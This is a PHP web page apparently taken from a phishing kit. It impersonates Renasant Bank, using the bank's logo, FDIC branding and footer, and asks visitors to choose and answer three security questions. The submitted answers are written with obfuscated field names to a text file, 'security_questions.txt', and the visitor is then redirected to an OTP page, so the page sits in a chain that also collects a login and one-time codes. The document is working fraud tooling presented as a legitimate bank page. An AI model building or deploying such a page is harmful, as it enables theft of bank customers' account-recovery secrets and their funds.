<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Questions - Renasant Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    <!-- Header -->
    <header class="bg-[#114b66]">
        <div class="max-w-6xl mx-auto">
            <div class="h-20 flex items-center justify-center px-6">
                <img
                    src="assets/Logo-Dark-Background.png"
                    alt="Renasant Bank"
                    class="h-10 w-auto"
                />
            </div>
        </div>
        <div class="bg-white/90">
            <div class="max-w-6xl mx-auto px-6 py-2 text-xs text-slate-600">
                <div class="flex items-center gap-3 italic">
                    <img
                        src="assets/FDIC_Logo_blue.svg"
                        alt="FDIC"
                        class="h-6 w-auto"
                    />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-center justify-center px-4 py-12">
        <div class="space-y-6 w-full max-w-2xl">
            <div class="bg-white rounded-md p-8 shadow-lg shadow-slate-900/10 space-y-6">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-semibold text-slate-700">Security Questions</h2>
                    <p class="text-sm text-slate-600">Please set up your security questions</p>
                </div>
                
                <?php if (!empty($errors)): ?>
                    <div class="bg-red-50 border-l-4 border-red-500 p-4">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                </svg>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-red-700">
                                    Please fix the following errors:
                                    <ul class="list-disc pl-5 mt-1">
                                        <?php foreach ($errors as $error): ?>
                                            <li><?php echo htmlspecialchars($error); ?></li>
                                        <?php endforeach; ?>
                                    </ul>
                                </p>
                            </div>
                        </div>
                    </div>
                <?php endif; ?>
                
                <form method="POST" class="space-y-4">
                    <!-- Question 1 -->
                    <div class="space-y-1">
                        <label for="question1" class="block text-sm text-slate-500 font-medium">
                            Security Question 1
                        </label>
                        <div class="relative">
                            <select
                                id="question1"
                                name="question1"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                required
                                onchange="updateQuestionOptions()"
                            >
                                <option value="">Select a question</option>
                                <?php foreach ($questions as $question): ?>
                                    <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                        <?php echo htmlspecialchars($question); ?>
                                    </option>
                                <?php endforeach; ?>
                            </select>
                            <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-slate-700">
                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z"/>
                                </svg>
                            </div>
                        </div>
                        <?php if (!empty($errors['question1'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question1']); ?></p>
                        <?php endif; ?>
                        <div>
                            <input
                                type="text"
                                name="answer1"
                                value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                class="w-full px-3 py-2 border border-slate-200 rounded-md focus:outline-none focus:ring-2 focus:ring-[#0f4f6c] focus:border-transparent"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer1'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                    
                    <!-- Question 2 -->
                    <div>
                        <label for="question2" class="block text-sm text-slate-500 font-medium mb-1">
                            Security Question 2
                        </label>
                        <select
                            id="question2"
                            name="question2"
                            class="w-full border border-slate-200 rounded-md px-3 py-2 focus:ring-2 focus:ring-[#0f4f6c] focus:outline-none"
                            required
                        >
                            <option value="">Select a question</option>
                            <?php 
                            $excludedQuestions = [$_POST['question1'] ?? ''];
                            foreach ($questions as $question): 
                                if (!in_array($question, $excludedQuestions)):
                            ?>
                                <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                    <?php echo htmlspecialchars($question); ?>
                                </option>
                            <?php 
                                endif;
                            endforeach; 
                            ?>
                        </select>
                        <?php if (!empty($errors['question2'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question2']); ?></p>
                        <?php endif; ?>
                        <div class="mt-2">
                            <input
                                type="text"
                                name="answer2"
                                value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                class="w-full border border-slate-200 rounded-md px-3 py-2 focus:ring-2 focus:ring-[#0f4f6c] focus:outline-none"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer2'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                    
                    <!-- Question 3 -->
                    <div>
                        <label for="question3" class="block text-sm text-slate-500 font-medium mb-1">
                            Security Question 3
                        </label>
                        <select
                            id="question3"
                            name="question3"
                            class="w-full border border-slate-200 rounded-md px-3 py-2 focus:ring-2 focus:ring-[#0f4f6c] focus:outline-none"
                            required
                        >
                            <option value="">Select a question</option>
                            <?php 
                            $excludedQuestions = [$_POST['question1'] ?? '', $_POST['question2'] ?? ''];
                            foreach ($questions as $question): 
                                if (!in_array($question, $excludedQuestions)):
                            ?>
                                <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                    <?php echo htmlspecialchars($question); ?>
                                </option>
                            <?php 
                                endif;
                            endforeach; 
                            ?>
                        </select>
                        <?php if (!empty($errors['question3'])): ?>
                            <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question3']); ?></p>
                        <?php endif; ?>
                        <div class="mt-2">
                            <input
                                type="text"
                                name="answer3"
                                value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                class="w-full border border-slate-200 rounded-md px-3 py-2 focus:ring-2 focus:ring-[#0f4f6c] focus:outline-none"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer3'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                    
                    <div class="pt-2">
                        <button
                            type="submit"
                            class="w-full bg-[#0f4f6c] text-white py-3 rounded-md font-medium transition hover:bg-[#0a3d52]"
                        >
                            Continue
                        </button>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#114b66] text-white">
        <div class="max-w-6xl mx-auto px-6 py-6">
            <div class="flex flex-col gap-4">
                <div class="flex items-center gap-4 text-sm">
                    <div class="flex items-center gap-3">
                        <img src="assets/ehl.svg" alt="Equal Housing Lender" class="h-10 w-auto" />
                        <img src="assets/fdic.svg" alt="Member FDIC" class="h-10 w-auto" />
                    </div>
                    <span class="uppercase tracking-wide text-xs">© RENASANT BANK</span>
                </div>

                <div class="flex flex-wrap gap-3 text-sm">
                    <a class="underline" href="#">Accessibility</a>
                    <span>|</span>
                    <a class="underline" href="#">Mobile Privacy</a>
                    <span>|</span>
                    <a class="underline" href="#">Privacy Statement</a>
                    <span>|</span>
                    <a class="underline" href="#">Digital Banking Agreement</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        const allQuestions = [
            'What was your childhood nickname?',
            "What is your mother's maiden name?",
            'What was the name of your first pet?',
            'What was the make and model of your first car?',
            'What city were you born in?',
            'What is your favorite childhood memory?',
            'What was your first job title?',
            'What is the name of your favorite teacher?',
            'What is your favorite book or movie character?',
            'What street did you grow up on?'
        ];

        function updateQuestionOptions() {
            const selected1 = document.getElementById('question1').value;
            const selected2 = document.getElementById('question2').value;
            const selected3 = document.getElementById('question3').value;
            
            // Update question2 options
            updateSelectOptions('question2', [selected1, selected3]);
            
            // Update question3 options
            updateSelectOptions('question3', [selected1, selected2]);
        }
        
        function updateSelectOptions(selectId, excludeValues) {
            const select = document.getElementById(selectId);
            const currentValue = select.value;
            const currentSelected = Array.from(select.selectedOptions).map(opt => opt.value);
            
            // Save the current value if it's not in the excluded values
            const shouldKeepCurrent = currentValue && !excludeValues.includes(currentValue);
            
            // Rebuild options
            select.innerHTML = '<option value="">Select a question</option>';
            
            allQuestions.forEach(question => {
                if (!excludeValues.includes(question)) {
                    const option = document.createElement('option');
                    option.value = question;
                    option.textContent = question;
                    if ((shouldKeepCurrent && question === currentValue) || currentSelected.includes(question)) {
                        option.selected = true;
                    }
                    select.appendChild(option);
                }
            });
        }
        
        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Add event listeners
            document.getElementById('question1')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question2')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question3')?.addEventListener('change', updateQuestionOptions);
            
            // Initial update
            updateQuestionOptions();
        });
    </script>
</body>
</html>
